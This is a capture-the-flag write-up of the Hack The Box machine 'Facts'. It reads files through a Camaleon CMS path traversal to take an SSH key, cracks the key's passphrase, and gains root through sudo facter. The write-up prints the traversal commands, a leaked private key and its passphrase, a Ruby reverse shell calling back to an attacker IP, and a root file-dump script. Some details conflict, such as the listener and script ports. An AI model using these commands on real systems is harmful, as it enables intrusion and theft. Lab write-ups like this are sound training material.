---
machineName: Facts
difficulty: Easy
Status: Done
OS: LInux
start_time: 2026-04-25T12:30:00
end_time: 2022-04-25T19:23:00
player_position: "13783"
CVEs:
  - "[CVE-2024-46987](https://nvd.nist.gov/vuln/detail/CVE-2024-46987)"
CWEs:
  - "[CWE-22](http://cwe.mitre.org/data/definitions/22.html)"
  - "[CWE-200](http://cwe.mitre.org/data/definitions/200.html)"
tools:
  - nmap
  - ffuf
  - wafw00f
  - ZAP
exploited_programs:
  - CamaleonCMS
  - Facter
open_ports:
  - "22"
  - "80"
  - "54321"
aliases:
  - Initial foothold through CVE poc -> PE by binary execution as root without passwd
tags:
  - "#HTB"
iconurl: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/bdcd209c32f156fbfb2268f099971f75.png
---
<div style="text-align: center;">
  <img
    src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/bdcd209c32f156fbfb2268f099971f75.png"
    width="200"
  >
</div>

# Initial Recon

## Nmap
```sh
nmap -sV -sC -p- 10.129.40.136                                  
```

```sh
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-25 13:41 +0200
Nmap scan report for 10.129.40.136
Host is up (0.016s latency).
Not shown: 65532 closed tcp ports (conn-refused)

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)

80/tcp    open  http    nginx 1.26.3 (Ubuntu)
|_http-server-header: nginx/1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/

54321/tcp open  http    Golang net/http server
|_http-server-header: MinIO
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 303
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 18A996CB24909174
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Sat, 25 Apr 2026 11:42:07 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/nice ports,/Trinity.txt.bak</Resource><RequestId>18A996CB24909174</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   GenericLines, Help, RTSPRequest, SSLSessionReq:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 276
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 18A996C796BAF50F
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Sat, 25 Apr 2026 11:41:51 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/</Resource><RequestId>18A996C796BAF50F</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Vary: Origin
|     Date: Sat, 25 Apr 2026 11:41:51 GMT
|_    Content-Length: 0
|_http-title: Did not follow redirect to http://10.129.40.136:9001
<SNIP>
...
<SNIP>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.69 seconds

```
## FFUF

```sh
ffuf -u http://facts.htb/FUZZ -w /home/drope/Applications/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```
```
sitemap                 [Status: 200, Size: 3508, Words: 424, Lines: 130, Duration: 1988ms]
rss                     [Status: 200, Size: 183, Words: 20, Lines: 9, Duration: 2096ms]
en                      [Status: 200, Size: 11109, Words: 1328, Lines: 125, Duration: 1418ms]
page                    [Status: 200, Size: 19593, Words: 3296, Lines: 282, Duration: 2003ms]
welcome                 [Status: 200, Size: 11966, Words: 1481, Lines: 130, Duration: 1442ms]
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1453ms]
post                    [Status: 200, Size: 11308, Words: 1414, Lines: 152, Duration: 1915ms]
ajax                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1727ms]
Index                   [Status: 200, Size: 11113, Words: 1328, Lines: 125, Duration: 1985ms]
up                      [Status: 200, Size: 73, Words: 4, Lines: 1, Duration: 1937ms]
-                       [Status: 200, Size: 11098, Words: 1328, Lines: 125, Duration: 1856ms]
404                     [Status: 200, Size: 4836, Words: 832, Lines: 115, Duration: 2017ms]
robots                  [Status: 200, Size: 33, Words: 2, Lines: 1, Duration: 1870ms]
EN                      [Status: 200, Size: 11109, Words: 1328, Lines: 125, Duration: 1788ms]
400                     [Status: 200, Size: 6685, Words: 993, Lines: 115, Duration: 1894ms]
error                   [Status: 500, Size: 7918, Words: 1035, Lines: 115, Duration: 1989ms]
500                     [Status: 200, Size: 7918, Words: 1035, Lines: 115, Duration: 1906ms]
422                     [Status: 200, Size: 8380, Words: 1063, Lines: 115, Duration: 1894ms]
captcha                 [Status: 200, Size: 6127, Words: 28, Lines: 29, Duration: 2333ms]
INDEX                   [Status: 200, Size: 11113, Words: 1328, Lines: 125, Duration: 1732ms]

```

From this we can see we have the following servcies running
- port 22 → [OpenSSH 9.9p1](https://www.openssh.org/)[4]
- port 80 → [Nginx 1.26.3](https://nginx.org/)[5]
- port 54321 → a [MinIO Bucket Storage System](https://github.com/minio/minio)[6]

The [FUFF](https://github.com/ffuf/ffuf)[7] scan also indicated that, there is an **admin** subdirectory, after visiting it 

![[images/htb_images/Pasted image 20260428171212.png]]


I created an account, and landed in a dashboard with an account setup that looked like this: 
![[images/htb_images/Pasted image 20260425153051.png]]

We can see that we are using [Cameleon CMS](https://camaleon.website/)[8]

Here I poked around for quite a while trying some different stuff, but nothing really worked, until I landed with this [CVE Advisory](https://github.com/advisories/GHSA-cp65-5m9r-vc2c)[9]

So i quickly searched for:
```sh
curl http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd
```
```
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

Then downloaded **trivia** [ssh](https://www.openssh.com)[10] key:

```sh
curl http://facts.htb/admin/media/download_private_file?file=../../../../../../home/trivia/.ssh/id_ed25519
```
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDaoktZAW
UqZC42fnE8EyTfAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIAO9SzoiHcSrnUzu
hRohS5BdDhcp8yBlbks29CYpAPyGAAAAoNIuYzVWO2EkDG+ujFOg2innCi9HKn+sQVR9fL
rtIL/sWPb44AIYI90yDsrP+wgTDpods/QSLW8HgDxq/KzSm4ayGSIfC5o6XcwsJ4icYvIt
3+Ic4k0G0iCBT0222ckwrrOnl9JJhjrwgeyKbRWRNKjmk0xmtL6BRlFdpn1n/Es2axNbSX
5w/FJUTAZQlQfqqgitlGfZn4KfGxGNN/jOmHU=
-----END OPENSSH PRIVATE KEY-----
```

But when we try to [ssh](https://www.openssh.com)[10] with it, we realize it requires a passphrase:

```sh
➜  Facts [I] : chmod 600 id_ed25519                                          [25/04/26 | 6:04:42]
➜  Facts [I] : ssh -i id_ed25519 trivia@10.129.40.136                        [25/04/26 | 6:04:47]
Enter passphrase for key 'id_ed25519':
```

We proceed to crack it with [john](https://www.openwall.com/john/)[11] the ripper, I think my installation was broken so I installed the jumbo version, but maybe it wasn’t necessary:

```sh
➜  Facts [I] : python3 ~/Applications/john-jumbo/run/ssh2john.py id_ed25519 >> ssh-hash            
➜  Facts [I] : ~/Applications/john-jumbo/run/john  --wordlist=/home/drope/Applications/SecLists/Passwords/Leaked-Databases/rockyou-75.txt ssh-hash
ssh-opencl: Cipher value of 6 is not yet supported with OpenCL
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
Cost 1 (KDF/cipher [0:MD5/AES 1:MD5/[3]DES 2:bcrypt-pbkdf/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
dragonballz      (id_ed25519)
1g 0:00:00:37 DONE (2026-04-25 18:39) 0.02644g/s 86.30p/s 86.30c/s 86.30C/s charles1..rootbeer
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We got the password for the **[ssh](https://www.openssh.com)[10]** key and we can login to trivia, I poked around and I saw we had access to the **william** user directory:

```
trivia@facts:~$ cat ../william/user.txt
2a9db62e44b6d8e5ea336dfdb9313882
```
# First Foothold

## 2nd Recon

Now that we had an initial foothold on the machine, as usual, I ran [linpeas](https://github.com/peass-ng/PEASS-ng)[12] on it, and it quickly hit jackpot

```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d (T1548.003)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

## Privilege Escalation

A quick look for **facter** in [GTFObins](https://gtfobins.org/gtfobins/facter/)[13], and we find this command:
```
sudo facter facter --custom-dir=. x
```

which executes as root the first **.rb** file in the custom-dir path.

I cobbled these two ruby scripts:

```rb
#!/usr/bin/env ruby
# syscall 33 = dup2 on 64-bit Linux
# syscall 63 = dup2 on 32-bit Linux
# test with nc -lvp 1337

require 'socket'

s = Socket.new 2,1
s.connect Socket.sockaddr_in 9001, '10.10.15.21'

[0,1,2].each { |fd| syscall 33, s.fileno, fd }
exec '/bin/sh -i'
```

```rb
def walk(dir, ext)  
	Dir.foreach(dir) do |entry|  
		next if entry == "." || entry == ".."  
  
		path = File.join(dir, entry)  
  
		if File.directory?(path)
			walk(path, ext)  
		else  
			if File.extname(path) == ext  
				puts path  
				puts File.read(path)  
			end  
		end  
	end  
end  
  
walk("/root", ".txt")
```

The first one is an usual ruby reverse shell, the second one if we are lazy just prints every **.txt** file on the `/root` dir.

I used the first approach, and just launched an [nc](https://nc110.sourceforge.io/)[14] listener : `nc -nlvp 4444`, and sure enough after executing the previous command, I got a connection as root.

# Wasted Time and False Alarms
Things I did that didn’t work
___

[Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)[15] detected a CVE vulnerability:

```
Vulnerable to CVE-2026-41651 (Pack2TheRoot) - PackageKit 1.3.0 is in the vulnerable range >=1.0.2 <=1.3.4
```

This CVE didn’t have a public poc, as it is pretty recent.


For a long time I also tried uploading different shells through the **Change Profile Picture** functionnality, I managed to upload them, but I couldn’t get them to execute. 

I briefly tried parameter fuzzing here with [FFUF](https://github.com/ffuf/ffuf)[16]:

```
http://facts.htb/search?q=test
http://facts.htb/page.php?page=2
```



# References

[1] CVE-2024-46987. [Online]. Available: https://nvd.nist.gov/vuln/detail/CVE-2024-46987
[2] CWE-22. [Online]. Available: http://cwe.mitre.org/data/definitions/22.html
[3] CWE-200. [Online]. Available: http://cwe.mitre.org/data/definitions/200.html
[4] OpenSSH 9.9p1. [Online]. Available: https://www.openssh.org/
[5] Nginx 1.26.3. [Online]. Available: https://nginx.org/
[6] MinIO Bucket Storage System. [Online]. Available: https://github.com/minio/minio
[7] FUFF. [Online]. Available: https://github.com/ffuf/ffuf
[8] Cameleon CMS. [Online]. Available: https://camaleon.website/
[9] CVE Advisory. [Online]. Available: https://github.com/advisories/GHSA-cp65-5m9r-vc2c
[10] ssh. [Online]. Available: https://www.openssh.com
[11] john. [Online]. Available: https://www.openwall.com/john/
[12] linpeas. [Online]. Available: https://github.com/peass-ng/PEASS-ng
[13] GTFObins. [Online]. Available: https://gtfobins.org/gtfobins/facter/
[14] nc. [Online]. Available: https://nc110.sourceforge.io/
[15] Linpeas. [Online]. Available: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
[16] FFUF. [Online]. Available: https://github.com/ffuf/ffuf
